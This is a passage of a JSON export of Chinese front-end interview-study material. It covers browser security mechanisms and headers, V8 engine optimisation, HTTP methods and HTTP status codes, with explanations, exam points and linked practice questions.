渲染进程与主进程隔离，限制恶意代码影响范围。\n   - **沙盒模式**：\n     - 渲染进程在沙盒中运行，限制文件系统和设备的访问权限。\n   - **插件隔离**：\n     - 为第三方插件提供独立的进程，避免对主进程的影响。\n   - **安全提示**：\n     - 浏览器提供恶意网站警告、证书异常提示。\n\n### 6. **浏览器安全头部**\n   - **CSP（Content Security Policy）**：\n     - 限制资源加载和执行来源。\n   - **X-Content-Type-Options**：\n     - 防止MIME类型混淆攻击。\n   - **X-Frame-Options**：\n     - 防止网页被嵌套在iframe中（点击劫持防护）。\n   - **Strict-Transport-Security**：\n     - 强制HTTPS，防止中间人攻击。\n   - **Referrer-Policy**：\n     - 控制请求头中的Referer信息。\n\n### 7. **密码管理与自动填充**\n   - 浏览器内置密码管理器的安全性。\n   - 防范自动填充信息泄露。\n\n### 8. **更新和补丁管理**\n   - 浏览器的定期更新机制，快速修复安全漏洞。\n\n### 9. **扩展程序和插件安全**\n   - **权限控制**：\n     - 谨慎授予扩展程序的权限。\n   - **恶意扩展的防范**：\n     - 安装来自可信来源的扩展。\n   - **插件沙盒**：\n     - 限制扩展的操作范围，防止越权。\n\n### 10. **开发者工具中的安全功能**\n   - **Audits/Performance工具**：检测安全漏洞。\n   - **网络面板**：检查传输中是否使用HTTPS。\n   - **安全面板**：查看证书和混合内容。\n\n### 11. **前端安全实践**\n   - **静态资源校验**：通过`Subresource Integrity (SRI)`验证外部资源。\n   - **输入验证和清理**：防止恶意数据注入。\n   - **环境隔离**：测试和生产环境隔离。",
    "exerciseKeyList": "[\"a1c9963f-fb40-4d8a-aa47-e5cca8c885b7\",\"0958b45c-a5b9-4087-9431-e0ca02ff0597\",\"f1de93ec-d1c8-48b0-98a9-bf256dfe2df0\",\"76826682-df0e-4dad-a50f-d500a09065cb\",\"6100dbed-3600-470f-90b1-b1c6ef213a52\",\"8740bcd2-4a52-4c22-aed1-d573eb42dfa9\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-12-17T14:22:22.000Z",
    "updateAt": "2025-08-07T11:40:05.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "0958b45c-a5b9-4087-9431-e0ca02ff0597",
        "title": "说说你对 XSS 的了解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T10:54:42.000Z",
        "updateAt": "2024-08-10T17:04:57.000Z"
      },
      {
        "exerciseKey": "6100dbed-3600-470f-90b1-b1c6ef213a52",
        "title": "webSocket 有哪些安全问题，应该如何应对？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-10-10T12:41:22.000Z",
        "updateAt": "2024-08-10T17:07:02.000Z"
      },
      {
        "exerciseKey": "76826682-df0e-4dad-a50f-d500a09065cb",
        "title": "https是如何保证安全的，又是如何保证不被中间人攻击的？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-24T01:26:03.000Z",
        "updateAt": "2024-08-10T17:07:22.000Z"
      },
      {
        "exerciseKey": "8740bcd2-4a52-4c22-aed1-d573eb42dfa9",
        "title": "HTTPS 为什么是安全的？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-11T04:48:54.000Z",
        "updateAt": "2024-08-10T17:05:23.000Z"
      },
      {
        "exerciseKey": "a1c9963f-fb40-4d8a-aa47-e5cca8c885b7",
        "title": "CSRF攻击及防护",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T15:33:42.000Z",
        "updateAt": "2024-07-18T23:22:04.000Z"
      },
      {
        "exerciseKey": "f1de93ec-d1c8-48b0-98a9-bf256dfe2df0",
        "title": "前端的常规安全策略",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T11:03:43.000Z",
        "updateAt": "2024-07-18T23:19:13.000Z"
      }
    ]
  },
  "222": {
    "id": 222,
    "tagId": 16,
    "title": "V8 引擎的优化机制",
    "explanation": "V8 是 Google 开发的 JavaScript 引擎（用于 Chrome、Node.js 等），它的核心优化机制可以总结为：**即时编译（JIT） + 隐式类型优化 + 内联缓存 + 垃圾回收机制**，通过这些方式来大幅提升 JS 的执行性能。\n\n## 一、V8 的执行流程\n\nV8 不直接解释执行 JavaScript，而是：\n\n1. **解析（Parser）**：将 JS 源码解析为 AST（抽象语法树）\n2. **生成字节码（Bytecode）**：由 `Ignition` 引擎生成并执行初始字节码\n3. **收集类型信息（Profiler）**：运行时收集变量类型、函数调用等信息\n4. **优化编译（JIT）**：将热点代码交给 `TurboFan` 引擎编译为高效的机器码\n\n## 二、核心优化机制\n\n### 1. **隐藏类（Hidden Class）与内联缓存（Inline Cache）**\n\n为了优化对象属性访问，V8 引入了隐藏类机制，类似 C++ 中的类结构：\n\n* 初次创建对象时，生成一个隐藏类（HiddenClass）\n* 添加属性时会生成新的隐藏类链表结构\n* 相同结构的对象共享隐藏类，从而使访问更快\n\n> 不要动态给对象添加属性，尽量保持对象结构稳定。\n\n**内联缓存**：缓存某个属性的访问位置，使得后续同样结构的对象访问不必重新查找。\n\n```js\nfunction Person(name) {\n  this.name = name;\n}\nconst p1 = new Person(\"Tom\");\nconst p2 = new Person(\"Jerry\");\n// 内联缓存会优化 this.name 的访问路径\n```\n\n### 2. **类型反馈与优化编译（Type Feedback + JIT）**\n\nV8 在执行字节码时会收集类型信息（比如函数参数、返回值的类型），并标记频繁调用的代码为“热点代码”：\n\n* 热点代码会被交给 `TurboFan` 做优化编译\n* 编译时使用收集到的类型信息来生成专用的机器码（类型特化）\n\n例如：\n\n```js\nfunction add(a, b) {\n  return a + b;\n}\nadd(1, 2);        // 优化为整数加法\nadd(\"a\", \"b\");    // 类型变化 -> 去优化\n```\n\n> 不要在同一个函数中混用不同类型，可能导致优化失败或退化。\n\n### 3. **内联函数（Function Inlining）**\n\n* 对频繁调用的小函数，V8 会尝试“内联展开”，避免函数调用的开销。\n* 减少上下文切换，提升性能。\n\n### 4. **逃逸分析（Escape Analysis）与栈上分配**\n\n* 如果一个对象只在函数内部使用，不会“逃逸”到外部，V8 会将其分配到栈上（而不是堆上）\n* 避免垃圾回收负担，提升性能\n\n```js\nfunction test() {\n  const obj = { x: 1, y: 2 }; // 栈上分配\n  return obj.x + obj.y;\n}\n```\n\n### 5. **惰性编译与延迟优化**\n\n* JS 函数在第一次调用时才编译，节省首次加载时间\n* 不频繁使用的函数不会被 JIT 编译\n\n## 三、V8 的垃圾回收机制（简略）\n\nV8 使用**分代式垃圾回收机制**：\n\n* 新生代（New Space）：生命周期短，使用 Scavenge 算法（复制+回收）\n* 老生代（Old Space）：生命周期长，使用 Mark-Sweep & Mark-Compact\n\nV8 会根据对象的“年龄”决定是否晋升为老生代。\n\n## 四、如何写出更易被 V8 优化的代码？\n\n* 保持对象结构稳定，不动态添加/删除属性\n* 避免数组稀疏、混合类型（数组元素类型尽量一致）\n* 避免在热点函数中使用 `try-catch`\n* 避免使用 `with`、`eval`、动态代码生成\n* 保持函数参数类型一致",
    "testPoint": "V8 引擎的优化机制相关的常见考点包括：\n\n### 1. **V8 引擎基本架构**\n   - **编译过程**：\n     - **解释执行（Interpreter）**：初次执行时，V8 使用解释器 (`Ignition`) 逐行执行 JavaScript 代码。\n     - **即时编译（JIT，Just-In-Time Compilation）**：对热点代码进行优化，生成机器码，提高执行效率。\n     - **TurboFan 编译器**：V8 的高级 JIT 编译器，针对热点代码生成高效的机器代码。\n\n### 2. **V8 引擎的优化机制**\n   - **热代码优化**：\n     - **热点代码（Hot Code）**：通过 `Ignition` 解释执行并监控代码的执行频率，将频繁执行的代码标记为热点代码，进行进一步优化。\n     - **内联缓存（Inline Caching）**：将访问对象属性的代码预先缓存起来，避免多次查找属性位置，提高访问性能。\n   - **逃逸分析（Escape Analysis）**：\n     - 分析变量是否可能逃逸当前作用域，未逃逸的变量可以在栈上分配而不是堆上分配，从而减少垃圾回收的负担。\n   - **隐藏类（Hidden Classes）**：\n     - 对于对象的属性访问，V8 为每个对象创建隐藏类（类似类的概念），根据对象属性的添加顺序生成不同的隐藏类，加速属性访问。\n   - **优化级别**：\n     - **快速路径（Fast Paths）**：通过内联缓存、隐藏类等技术，提高常见操作的执行效率。\n     - **缓慢路径（Slow Paths）**：当代码执行不符合优化条件时，V8 会退回到较慢的执行路径。\n\n### 3. **内存管理与垃圾回收优化**\n   - **垃圾回收机制**：\n     - V8 使用 **标记-清除** 和 **标记-压缩** 的垃圾回收算法。\n     - **分代垃圾回收（Generational Garbage Collection）**：将对象按生命周期分为年轻代和老年代，年轻代对象经过多次 GC 会晋升为老年代，提高 GC 性能。\n   - **减少垃圾回收暂停**：通过增量 GC、并行 GC 和异步 GC 等策略，减少垃圾回收对应用性能的影响。\n   \n### 4. **字节码优化**\n   - **Ignition**：V8 的解释器，通过生成字节码来加速初次执行。\n   - **字节码优化**：\n     - 在解释执行过程中，V8 可以对字节码进行优化，选择适合执行路径的字节码。\n     - 优化字节码时，V8 会采用 **内联缓存** 和 **类型反馈** 等技术，以加速后续执行。\n\n### 5. **JIT 编译与优化**\n   - **TurboFan**：V8 的高级编译器，通过对热点代码的分析和优化，生成高效的机器代码。\n   - **类型推测与优化**：V8 会在运行时推测变量的类型，利用这些类型信息生成更加优化的代码。\n   - **代码内联（Inlining）**：将函数调用直接嵌入到调用点，减少函数调用的开销。\n   - **死代码消除（Dead Code Elimination）**：在编译过程中去除不会执行的代码，减少冗余指令。\n   - **常量折叠（Constant Folding）**：将常量表达式在编译时计算出结果，避免运行时计算。\n   - **循环优化**：优化循环结构，如循环展开和循环不变代码外提。\n\n### 6. **内联缓存（Inline Caching）**\n   - **基础内联缓存（IC）**：用于缓存对象属性查找结果，减少每次访问对象属性时的查找时间。\n   - **多级内联缓存（MegaIC）**：提高属性查找的效率，通过缓存多个不同的对象类型信息，进一步加速访问过程。\n\n### 7. **类型反馈与类型优化**\n   - **类型反馈（Type Feedback）**：V8 收集执行时的信息（如变量的类型、方法的调用次数等），通过反馈来优化后续的代码执行。\n   - **类型预测（Type Inference）**：V8 根据执行过程中收集到的类型信息推测变量的类型，优化后续的操作。\n\n### 8. **尾调用优化（Tail Call Optimization）**\n   - **尾递归优化（Tail Recursion Optimization）**：当函数的最后一个操作是调用自身时，V8 会优化递归调用，避免栈溢出，提升递归性能。\n\n### 9. **异步与事件循环优化**\n   - **异步任务优化**：V8 优化异步代码的执行，通过事件循环和回调队列处理异步任务，避免阻塞。\n   - **微任务和宏任务**：对微任务（如`Promise`的回调）和宏任务（如`setTimeout`）的调度优化，确保事件循环的高效运行。\n\n### 10. **代码生成与优化**\n   - **优化指令生成**：V8 通过对编译的机器码进行优化生成更加高效的指令集，提升性能。\n   - **生成器与迭代器优化**：对于生成器函数（`function*`）和迭代器，V8 使用专门的优化策略，减少性能开销。\n\n### 11. **热代码监控与优化策略**\n   - **代码热路径分析**：V8 会实时监控哪些代码路径是热点代码，并对其进行优化。\n   - **优化反馈机制**：通过 JIT 编译器反馈信息，V8 可以决定是否继续优化某段代码。\n\n### 12. **V8 引擎的调试与分析工具**\n   - **Chrome DevTools**：V8 提供了详细的性能分析工具，通过`Profiler`、`Timeline`、`Heap Snapshots`等工具来检测性能瓶颈和内存问题。\n   - **V8 Tracing**：用于生成 V8 引擎内部执行过程的详细日志，帮助开发者进行性能分析。",
    "exerciseKeyList": "[\"cf129fa3-c1ec-4147-85ac-7274d4ea3e72\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-12-17T14:26:03.000Z",
    "updateAt": "2025-08-07T11:44:49.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "cf129fa3-c1ec-4147-85ac-7274d4ea3e72",
        "title": "说说你对 V8 引擎的了解",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T19:51:26.000Z"
      }
    ]
  },
  "223": {
    "id": 223,
    "tagId": 16,
    "title": "http方法",
    "explanation": "HTTP 协议中定义了多种 **请求方法（HTTP Methods）**，用于客户端和服务器之间进行不同的操作。\n\n### 一、常用的 HTTP 方法\n\n| 方法         | 是否幂等  | 是否安全  | 说明                            |\n| ---------- | ----- | ----- | ----------------------------- |\n| **GET**    | ✅ 幂等  | ✅ 安全  | 获取资源。请求参数放在 URL 上。不会对资源产生副作用。 |\n| **POST**   | ❌ 非幂等 | ❌ 不安全 | 提交数据（如表单、上传），可能导致资源变化或创建。     |\n| **PUT**    | ✅ 幂等  | ❌ 不安全 | 用于**整体更新**某个资源（数据完全替换）。       |\n| **PATCH**  | ❌ 非幂等 | ❌ 不安全 | 用于**部分更新**资源（只改动部分字段）。        |\n| **DELETE** | ✅ 幂等  | ❌ 不安全 | 删除指定资源。                       |\n\n---\n\n### 二、幂等性和安全性解释\n\n* **幂等（Idempotent）**：同一个请求重复执行多次，结果应一样。例如多次 DELETE 相同资源结果相同。\n* **安全（Safe）**：不对服务器资源造成副作用。GET 只查询，不修改数据，因此是安全的。\n\n---\n\n### 三、其他常见 HTTP 方法\n\n| 方法          | 说明                                        |\n| ----------- | ----------------------------------------- |\n| **HEAD**    | 类似 GET，但不返回响应体，只返回响应头。常用于检测资源是否存在、获取响应信息。 |\n| **OPTIONS** | 用于客户端获取服务器支持哪些方法。也是 CORS 预检请求的一部分。        |\n| **TRACE**   | 回显服务器收到的请求，主要用于调试。很少使用，可能存在安全隐患。          |\n| **CONNECT** | 用于建立隧道（如 HTTPS 的代理通信）。                    |\n\n\n### 四、使用场景示例\n\n| 场景     | 方法          | 示例                                        |\n| ------ | ----------- | ----------------------------------------- |\n| 获取用户列表 | GET         | `GET /api/users`                          |\n| 创建用户   | POST        | `POST /api/users`                         |\n| 更新用户信息 | PUT / PATCH | `PUT /api/users/1` 或 `PATCH /api/users/1` |\n| 删除用户   | DELETE      | `DELETE /api/users/1`                     |\n\n### 总结：记住这几点\n\n1. **GET** 用于查询（安全、幂等）。\n2. **POST** 用于新增（不幂等）。\n3. **PUT/PATCH** 用于修改资源（PUT 是整体替换，PATCH 是部分更新）。\n4. **DELETE** 用于删除资源（幂等，但不安全）。\n5. **OPTIONS/HEAD** 用于辅助请求。",
    "testPoint": "#### 1. **语义理解**\n\n* 每个方法在 RESTful API 中代表的含义？\n* PUT 和 PATCH 的区别？\n* GET 和 POST 区别？是否可以用 POST 替代 GET？\n\n#### 2. **幂等性与安全性**\n\n* 哪些方法是幂等的？（调用多次结果一致）\n* 哪些方法是安全的？（不会对服务器资源产生副作用）\n\n#### 3. **浏览器行为**\n\n* 表单默认提交方式是什么？（GET 或 POST）\n* GET 请求能携带 body 吗？（规范上不能，但部分浏览器允许）\n\n#### 4. **缓存行为**\n\n* 浏览器对 GET、POST 的缓存行为有什么区别？\n* 为什么 GET 更适合缓存？\n\n#### 5. **跨域相关（CORS）**\n\n* 哪些方法属于“简单请求”？\n* 使用 PUT/PATCH/DELETE 会触发预检请求（OPTIONS），为什么？\n\n#### 6. **请求体与响应体**\n\n* 哪些方法通常不携带请求体？（如 GET、DELETE）\n* 哪些方法可以/需要携带请求体？（如 POST、PUT、PATCH）\n\n#### 7. **对比和实际使用中的陷阱**\n\n* PUT/POST 混用的场景（如某些系统用 POST 实现更新）\n* DELETE 是否要有请求体？（规范允许，但不推荐）\n\n### 可能的延伸考察\n\n#### RESTful API 设计规范\n\n* REST API 中，如何正确使用 GET/POST/PUT/DELETE 等方法？\n* 设计一个增删改查接口，如何对应到不同 HTTP 方法？\n\n#### 状态码与方法配合\n\n* DELETE 成功一般返回什么状态码？（如 204 No Content）\n* POST 创建资源后返回什么？（201 Created）\n\n#### 结合安全问题\n\n* POST/PUT 方法可能面临哪些安全风险？如 CSRF？\n* 为什么建议对非幂等方法加 CSRF 防护？",
    "exerciseKeyList": "[\"b7e5c9a8-6756-4c79-9b75-a3cb680e12b4\",\"ecd8b4c8-cbb9-47c4-84e3-167e209637ae\",\"bddd2a34-2ccf-44ba-9cca-4213619b4e8e\",\"706d3e5d-a02b-4925-84e2-3e2c81c7ef1b\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2025-07-26T02:25:21.000Z",
    "updateAt": "2025-08-07T11:48:30.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "706d3e5d-a02b-4925-84e2-3e2c81c7ef1b",
        "title": "GET和POST的请求的区别",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T15:49:57.000Z",
        "updateAt": "2024-07-19T18:13:40.000Z"
      },
      {
        "exerciseKey": "b7e5c9a8-6756-4c79-9b75-a3cb680e12b4",
        "title": "get 请求的参数是否能够使用数组？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-20T03:05:55.000Z",
        "updateAt": "2024-08-20T11:14:21.000Z"
      },
      {
        "exerciseKey": "bddd2a34-2ccf-44ba-9cca-4213619b4e8e",
        "title": "get 请求是否限制了传参长度？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-11-17T14:37:52.000Z",
        "updateAt": "2021-11-17T22:49:27.000Z"
      },
      {
        "exerciseKey": "ecd8b4c8-cbb9-47c4-84e3-167e209637ae",
        "title": "get 和 post 请求在缓存方面有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-11-17T14:38:25.000Z",
        "updateAt": "2021-11-17T22:51:03.000Z"
      }
    ]
  },
  "224": {
    "id": 224,
    "tagId": 16,
    "title": "http状态码",
    "explanation": "## 一、HTTP 状态码概述\n\n### 1. 概念\n\n当我们在浏览器输入URL并按下Enter键时，浏览器就会向站点的服务器发送一个HTTP请求，服务器接收并处理请求，然后将相关资源和HTTP标头一起返回。可以在浏览器的Network中查看 HTTP 的请求状态码：\n\n![](https://static.ecool.fun//article/bccafbeb-0f84-4e92-89d5-f0396efeaced.awebp)\n\n维基百科中对**HTTP状态码**的解释：\n\n> HTTP状态码（HTTP Status Code）是用以表示网页服务器超文本传输协议响应状态的3位数字代码。它由 RFC 2616 规范定义的，并得到 RFC 2518、RFC 2817、RFC 2295、RFC 2774 与 RFC 4918 等规范扩展。所有状态码被分为五类，状态码的第一个数字代表了响应的五种状态之一。所示的消息短语是典型的，但是可以提供任何可读取的替代方案。 除非另有说明，状态码是HTTP/1.1标准（RFC 7231）的一部分。\n\nHTTP 状态代码是从 Web 服务器发送的 3 位代码（如 200 OK 或 404 Not Found），用于让我们和搜索引擎知道请求中是否存在任何错误或服务器尝试处理请求时是否存在任何问题。\n\n### 2. 分类\n\n应用通常就是客户端向服务器发出请求，服务器做出响应。状态码就是让我们知道 HTTP 请求是成功、失败还是其他。HTTP状态码通常分为五类：\n\n| **类别** | **定义** | **描述** |\n| --- | --- | --- |\n| 1xx | Informational(信息性状态码) | 接受的请求正在处理 |\n| 2xx | Success(成功状态码) | 请求正常处理完毕 |\n| 3xx | Redirection(重定向状态码) | 需要进行附加操作来完成请求 |\n| 4xx | Client Error (客户端错误状态码) | 服务器无法处理请求 |\n| 5xx | Server Error(服务器错误状态码) | 服务器处理请求出错 |\n\n### 3. 重要性\n\nHTTP 状态代码对于诊断应用问题很重要，例如网络服务器是否无法正常工作且无法提供页面等。快速发现这些问题对于开发人员和搜索引擎提供良好的体验非常重要。那为什么 HTTP 状态代码和错误对搜索引擎优化 (SEO) 很重要呢？\n\n搜索引擎机器人在抓取网站时会看到 HTTP 状态码。在某些情况下，这些会影响网页是否以及如何被编入索引，以及搜索引擎如何看待网站的健康状况。\n\n一般来说，1XX 和 2XX 状态码不会对 SEO 产生太大影响。因为它们表明网站上是正常运行的，并使搜索引擎机器人能够继续执行操作。但是，它们并不会提高网站的排名。在大多数情况下，对 SEO 重要的是更高级别的代码。4XX 和 5XX 响应会阻止机器人抓取和索引页面。错误太多也可能表明网站质量不高，可能会降低网站的排名。\n\n3XX 状态码与 SEO 的关系就会复杂很多。要想了解它们的影响，就需要了解永久重定向和临时重定向之间的区别，这里先不解释，后面再详细介绍。总之，对已经迁移的页面使用永久重定向会有更好的SEO。\n\n可以使用 Google Search Console，在覆盖率报告中查看 3XX、4XX 和 5XX 的状态代码：\n\n![](https://static.ecool.fun//article/09584b63-c8e2-4b20-997c-a0f3d9eac732.awebp)\n\n这个报告中会显示网站中四种类型的页面：\n\n* 返回错误的页面；\n* 有警告但是有效的页面；\n* 有效的页面；\n* 从索引中排除的页面；\n\n我们可以在除了有效页面之外的三类中找到3XX、4XX、5XX 的HTTO状态码的页面，具体的话取决于状态码类型，比如301重定向可能会出现在最后一种中。\n\n![](https://static.ecool.fun//article/e3b67d24-65e7-4376-8eb1-50286c041915.awebp)\n\n4XX 和 5XX 状态码可能会出现在Error下。\n\n## 二、HTTP 状态码列表\n\n### 1. 1xx Informational\n\n1XX的状态码是在HTTP/1.1 中引入的，它们是信息性的状态码，是临时的，表示请求已被接受，需要继续处理。这些状态码并没有提供太多有用的信息，我们可能永远看不到1XX相关的状态码。\n\n#### （1）100 Continue\n\n服务器已收到浏览器的请求标头，并且现在已准备好发送请求正文。这使得请求过程更加高效，因为它可以防止浏览器发送正文请求，即使标头已被拒绝。\n\n#### （2）101 Switching Protocols\n\n服务器已经接受了客户端的请求，并将通过`Upgrade`消息头通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后，服务器将会切换到在Upgrade消息头中定义的协议。\n\n#### （3）102 Processing\n\n服务器已经收到并正在处理请求，目前还没有响应。这样可以防止客户端超时，并假设请求丢失。\n\n#### （4）103 Early hints\n\n在服务器响应的HTTP消息之前返回一些响应头。该状态码用于允许用户代理预加载资源，同时服务器准备响应。\n\n### 2. 2xx Success\n\n2xx 状态码表示客户端的请求被成功接收、理解和接受。\n\n#### （1）200 OK\n\n表示客户端发来的请求被服务器端正常处理了。从 SEO 的角度来看，200 OK 状态码是功能页面的完美状态码，所有链接页面都在正常工作。200 表示搜索引擎爬虫可以成功爬取该页面并将其放入其搜索引擎中。\n\n#### （2）201 Created\n\n服务器完成了浏览器的请求，因此创建了一个或多个新资源。\n\n#### （3）202 Accepted\n\n服务器已接受浏览器的请求，但仍在处理中。该请求最终可能会也可能不会进行响应。\n\n#### （4）203 Non-authoritative Information\n\n使用代理时可能会出现此状态代码。这意味着代理服务器从源服务器收到了 200 状态代码，但在将响应传递给浏览器之前已对其进行了修改。\n\n#### （5）204 No Content\n\n该状态码表示客户端发送的请求已经在服务器端正常处理了，但是没有返回的内容，响应报文中不包含实体的主体部分。一般在只需要从客户端往服务器端发送信息，而服务器端不需要往客户端发送内容时使用。\n\n#### （6）205 Reset Content\n\n服务器端成功处理了请求，且没有返回任何内容。但是与204响应不同，返回此状态码的响应要求请求者重置文档视图。该响应主要是被用于接受用户输入后，立即重置表单，以便用户能够轻松地开始另一次输入。\n\n#### （7）206 Partial Content\n\n该状态码表示客户端进行了范围请求，而服务器端执行了这部分的 GET 请求。响应报文中包含由 `Content-Range` 指定范围的实体内容。\n\n#### （8）226 IM Used\n\n服务器已成功处理浏览器的 GET 方法，以检索已缓存资源的更新版本。通常，当请求的资源有一个或多个轻微修改时返回响应。\n\n### 3. 3xx Redirection\n\n3XX 响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。\n\n#### （1）300 Multiple Choices\n\n有时，服务器可能会响应多种可能的资源来满足浏览器的请求。300 状态码意味着浏览器现在需要在它们之间进行选择。当有多个可用的文件类型扩展名时，可能会发生这种情况。\n\n#### （2）301 Moved Permanently\n\n\\*\\*永久重定向。\\*\\*已为目标资源分配了一个新的永久 URI。新的 URI 会在 HTTP 响应头中的 Location 首部字段指定。若用户已经把原来的URI保存为书签，此时会按照 Location 中新的URI重新保存该书签。同时，搜索引擎在抓取新内容的同时也将旧的网址替换为重定向之后的网址。\n\n#### （3）302 Found\n\n\\*\\*临时重定向。\\*\\*请求的资源被分配到了新的 URI，希望用户（本次）能使用新的 URI 访问资源。和 301 Moved Permanently 状态码相似，但是 302 代表的资源不是被永久重定向，只是临时性质的。也就是说已移动的资源对应的 URI 将来还有可能发生改变。\n\n若用户把 URI 保存成书签，但不会像 301 状态码出现时那样去更新书签，而是仍旧保留返回 302 状态码的页面对应的 URI。同时，搜索引擎会抓取新的内容而保留旧的网址。因为服务器返回302代码，搜索引擎认为新的网址只是暂时的。\n\n**使用场景：**\n\n* 未登陆的用户访问用户中心重定向到登录页面。\n* 访问404页面重新定向到首页。\n\n#### （4）303 See Other\n\n由于请求对应的资源存在着另一个 URI，应使用 GET 方法定向获取请求的资源。\n\n303 状态码和 302 Found 状态码有着相似的功能，但是 303 状态码明确表示客户端应当采用 GET 方法获取资源。303 状态码通常作为 PUT 或 POST 操作的返回结果，它表示重定向链接指向的不是新上传的资源，而是另外一个页面，比如消息确认页面或上传进度页面。而请求重定向页面的方法要总是使用 GET。\n\n注意：\n\n> * 当 301、302、303 响应状态码返回时，几乎所有的浏览器都会把 POST 改成GET，并删除请求报文内的主体，之后请求会再次自动发送。\n> * 301、302 标准是禁止将 POST 方法变成 GET方法的，但实际大家都会这么做。\n\n#### （5）304 Not Modified\n\n浏览器缓存相关。该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况。304 状态码返回时，不包含任何响应的主体部分。304 虽然被划分在 3XX 类别中，但是和重定向没有关系。\n\n带条件的请求（Http 条件请求）：使用 Get方法 请求，请求报文中包含（`if-match`、`if-none-match`、`if-modified-since`、`if-unmodified-since`、`if-range`）中任意首部。\n\n状态码304并不是一种错误，而是告诉客户端有缓存，直接使用缓存中的数据。返回页面的只有头部信息，是没有内容部分的，这样在一定程度上提高了网页的性能。\n\n#### （6）305 Use Proxy\n\n服务器需要代理才能返回请求的资源。此响应代码当前未使用，因为当前大多数浏览器由于安全问题不支持它。\n\n#### （7）307 Temporary Redirect\n\n**临时重定向**。该状态码与 302 Found 有着相同含义，尽管 302 标准禁止 POST 变成 GET，但是实际使用时还是用了。307 会遵守浏览器标准，**不会从 POST 变成 GET**。但是对于处理请求的行为时，不同浏览器还是会出现不同的情况。规范要求浏览器继续向 Location 的地址 POST 内容。规范要求浏览器继续向 Location 的地址 POST 内容。\n\n#### （8）308 Permanent Redirect\n\n永久重定向，当前及未来的请求重定向到了新的 URL。\n\n### 4. 4xx Client errors\n\n#### （1）400 Bad Request\n\n请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次发送请求。\n\n#### （2）401 Unauthorized\n\n发送的请求需要有通过 HTTP 认证(BASIC 认证、DIGEST 认证)的认证信息。若之前已进行过一次请求，则表示用户认证失败。返回含有 401 的响应必须包含一个适用于被请求资源的 WWW-Authenticate 首部用以质询(challenge)用户信息。当浏览器初次接收到 401 响应，会弹出认证用的对话窗口。\n\n#### （3）402 Payment Required\n\n为数字支付系统保留的。不过，它并没有被广泛使用。\n\n#### （4）403 Forbidden\n\n客户端请求已被拒绝，因为客户端无权访问内容。与 401 不同，服务器知道客户端的身份，但由于他们无权查看内容，因此服务器拒绝提供正确的响应。\n\n#### （5）404 Not Found\n\n服务器上无法找到请求的资源，但将来可能可用。除此之外，也可以在服务器端拒绝请求且不想说明理由时使用。\n\n#### （6）405 Method Not Allowed\n\n服务器识别到浏览器使用的 HTTP 请求方法，但需要使用不同的方法才能提供所需的资源。服务器应该总是允许客户端使用 GET 和 HEAD 方法进行访问。\n\n客户端可以通过 OPTIONS 方法（预检）来查看服务器允许的访问方法, 如下\n\n```\nAccess-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE\n\n```\n\n#### （7）406 Not Acceptable\n\n服务器通知客户端没有资源符合浏览器请求的标准。\n\n#### （8）407 Proxy Authentication Required\n\n客户端必须首先通过代理进行身份验证。\n\n#### （9）408 Request Timeout\n\n当服务器在等待来自浏览器的完整请求时超时时会生成此状态码。换句话说，服务器没有收到浏览器发送的完整请求。一种可能的原因就是网络拥塞导致浏览器和服务器之间的数据包丢失。\n\n#### （10）409 Conflict\n\n服务器无法处理浏览器的请求，因为与相关资源存在冲突。这有时是由于多个同时编辑而发生的。\n\n#### （11）410 Gone\n\n请求的资源将来将不再可用。\n\n#### （12）411 Length Required\n\n请求的资源需要客户端指定一定的长度，通过 Content-Length 来定义。\n\n#### （13）412 Precondition Failed\n\n服务器不满足请求头字段中指示的一个或多个先决条件。\n\n#### （14）413 Payload Too Large\n\n服务器拒绝处理请求，因为请求的负载大于服务器能够或愿意处理的。虽然服务器可能会关闭连接以阻止客户端继续请求，但它应该生成一个 Retry-After 头字段以及客户端可以在多长时间后重试。\n\n#### （15）414 Request-URI Too Long\n\n浏览器发出的请求无法被服务器处理，因为客户端将太多数据编码为查询字符串，然后作为 GET 方法发送。\n\n#### （16）415 Unsupported Media Type\n\n请求已被服务器拒绝，因为它不支持请求数据的媒体格式。\n\n#### （17）416 Requested Range Not Satisfiable\n\n请求的 Range 头中指定的范围无法满足。原因可能是给定范围超出了目标 URI 数据的大小。\n\n#### （18）417 Expectation Failed\n\n服务器无法满足请求的请求头的 Expect 字段中指定的要求。\n\n#### （19）421 Misdirected Request\n\n浏览器的请求已被重定向到其他服务器，该服务器无法产生响应。\n\n#### （20）422 Unprocessable Entity\n\n浏览器发出的请求中存在语义错误，服务器无法处理。\n\n#### （21）423 Locked\n\n对所需资源的访问被拒绝，因为它已被锁定。\n\n#### （22）424 Failed Dependency\n\n浏览器发出的请求失败，因为它依赖于另一个请求，而该请求失败了。\n\n#### （23）426 Upgrade Required\n\n当服务器拒绝使用当前协议执行给定的请求时，它可能愿意在客户端升级到不同的协议后这来执行请求。\n\n#### （24）428 Precondition Required\n\n服务器要求在处理请求之前指定条件。\n\n#### （25）429 Too Many Requests\n\n用户在给定的时间内发送了太多请求（速率限制）时，这是由服务器生成的。这有时可能是由于机器人或脚本试图访问站点而造成的。\n\n#### （26）431 Request Header Fields Too 